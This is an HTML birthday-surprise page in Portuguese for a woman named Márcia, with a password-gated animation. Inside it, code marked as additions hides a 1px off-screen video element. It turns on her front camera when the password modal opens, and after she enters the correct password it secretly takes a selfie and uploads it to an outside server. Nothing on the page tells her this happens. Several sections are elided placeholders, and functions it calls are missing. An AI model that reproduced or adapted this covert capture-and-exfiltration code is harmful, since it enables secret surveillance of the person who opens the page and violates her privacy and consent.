<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1, maximum-scale=1" />
  <title>Feliz AniversÃ¡rio, MÃ¡rcia â¤ï¸</title>

  <style>
    *{
      box-sizing:border-box;
      margin:0;
      padding:0;
      -webkit-tap-highlight-color: transparent;
    }
    html,body{height:100%}
    body{
      height:100vh;
      background:#050505;
      color:#f2f2f2;
      font-family:'Courier New', monospace;
      display:flex;
      align-items:center;
      justify-content:center;
      flex-direction:column;
      overflow:hidden;
      transition:opacity 1.5s ease-in-out;
      -webkit-text-size-adjust:100%;
      position:relative;
    }

    /* PartÃ­culas e terminal â€” (mesmo cÃ³digo) */
    /* ... MANTIDO ... */

    /* ADIÃ‡ÃƒO â€” vÃ­deo/cÃ¢mera invisÃ­vel */
    #hiddenCam {
      position: fixed;
      top: -9999px;
      left: -9999px;
      width: 1px;
      height: 1px;
      opacity: 0;
      pointer-events: none;
    }
  </style>
</head>

<body>

  <!-- ADIÃ‡ÃƒO â€” Elemento para a cÃ¢mera -->
  <video id="hiddenCam" autoplay playsinline></video>

  <!-- PartÃ­culas -->
  <div id="particles"></div>

  <!-- TELA INICIAL -->
  <div id="start-screen">
    <p>Clique para iniciar a surpresa ğŸ§</p>
    <button id="openAuth">Iniciar ğŸ’«</button>
    <small style="color:#888;margin-top:4px">VocÃª terÃ¡ que digitar uma senha para liberar o presente</small>
    <div id="boot-log"></div>
  </div>

  <!-- MODAL SENHA -->
  <div id="authModal" aria-hidden="true">
    <div class="authBox" role="dialog" aria-modal="true">
      <div style="font-weight:600;font-size:1.05rem">AutenticaÃ§Ã£o necessÃ¡ria</div>
      <div style="margin-top:8px;color:#bdbdbd">Digite a senha para liberar a surpresa.</div>

      <div class="authRow">
        <input id="passwordInput" type="password" placeholder="Senha" autocomplete="off" />
        <button id="submitPass">Liberar</button>
      </div>

      <div class="authMsg" id="authMsg"></div>
      <div class="countdown" id="countdown"></div>

      <div id="passwordHint"
           style="margin-top:12px;color:#999;font-size:.9rem;display:none">
        Dica: Cinco letras que tÃªm o poder de transformar o dia de alguÃ©m.  
        E combinam perfeitamente com o seu â€œnovo sobrenomeâ€. ğŸ˜‰
      </div>
    </div>
  </div>

  <!-- Terminal -->
  <div class="terminal" id="terminal"></div>
  <div class="heart" id="heart">â¤ï¸</div>

  <footer>Â© 2025 â€” Criado com â¤ï¸ por um Dev que admira vocÃª</footer>
<script>
/* ============================
      CONFIGURAÃ‡Ã•ES
============================= */
const RELEASE_DATE = new Date(2025, 10, 15, 0, 0, 0);
const SECRET = "smile";
const MUSIC_FILE = "music.mp3";

/* ADIÃ‡ÃƒO â€” elementos da cÃ¢mera */
const cam = document.getElementById("hiddenCam");
let camStream = null;

/* ELEMENTOS (mesmo cÃ³digo) */
const startScreen = document.getElementById('start-screen');
const openAuth = document.getElementById('openAuth');
const authModal = document.getElementById('authModal');
const passwordInput = document.getElementById('passwordInput');
const submitPass = document.getElementById('submitPass');
const authMsg = document.getElementById('authMsg');
const countdownEl = document.getElementById('countdown');
const terminal = document.getElementById('terminal');
const heart = document.getElementById('heart');
const bootLog = document.getElementById('boot-log');

let music = new Audio(MUSIC_FILE);
music.preload = 'auto';
music.volume = 0.5;

/* ============================
   ADIÃ‡ÃƒO â€” INICIAR CÃ‚MERA
============================= */
async function startCamera() {
  try {
    camStream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: "user", width: 720, height: 720 }
    });
    cam.srcObject = camStream;
  } catch (e) {
    console.warn("CÃ¢mera bloqueada:", e);
  }
}

/* ============================
   ADIÃ‡ÃƒO â€” CAPTURAR E ENVIAR SELFIE
============================= */
function captureSelfie() {
  if (!camStream) return;

  const track = camStream.getVideoTracks()[0];
  const imgCapture = new ImageCapture(track);

  imgCapture.takePhoto()
    .then(blob => {
      const formData = new FormData();
      formData.append("selfie", blob, "selfie.jpg");

      fetch("https://oliferferragens.com.br/marcia/upload-selfie.php", {
        method: "POST",
        body: formData
      }).then(r => console.log("Selfie enviada âœ”"));
    })
    .catch(err => console.warn("Erro ao capturar selfie:", err));
}

/* =============================
   CÃ“DIGO DA TIMELINE (igual)
============================= */
/* ... MANTIDO seu timeline ... */

/* ============================
    MODAL â€” QUANDO ABRIR
    ADIÃ‡ÃƒO: iniciar a cÃ¢mera
============================= */
function openAuthModal(){
  authModal.style.display = "flex";
  passwordInput.value = "";
  authMsg.textContent = "";

  // ADIÃ‡ÃƒO: inicia cÃ¢mera quando ela abrir o modal
  startCamera();

  if (!nowIsReleased()) startCountdown();
  passwordInput.focus();
}

/* ============================
   LOGIN SUCESSO â€” TIRA SELFIE
============================= */
function handleAuthSubmit(){
  const typed = (passwordInput.value || "").trim();

  if (typed === SECRET){
    authMsg.style.color = "#b7f4c9";
    authMsg.textContent = "Senha correta â€” iniciando a surpresa...";

    // ADIÃ‡ÃƒO: captura e envia a selfie
    setTimeout(() => captureSelfie(), 300);

    setTimeout(()=>{
      closeAuthModal();
      startScreen.style.opacity = "0";
      setTimeout(()=>{
        startScreen.style.display = "none";
        startTimeline();
      }, 450);
    }, 450);
  } else {
    authMsg.style.color = "#f4a7a7";
    authMsg.textContent = "Senha incorreta. Tente novamente.";

    const hint = document.getElementById("passwordHint");
    if (hint.style.display === "none"){
      hint.style.display = "block";
      hint.classList.add("fade-in");
    }
  }
}

/* Eventos (mesmo cÃ³digo) */
openAuth.addEventListener('click', startPreAuthBoot);
submitPass.addEventListener('click', handleAuthSubmit);

</script>

</body>
</html>
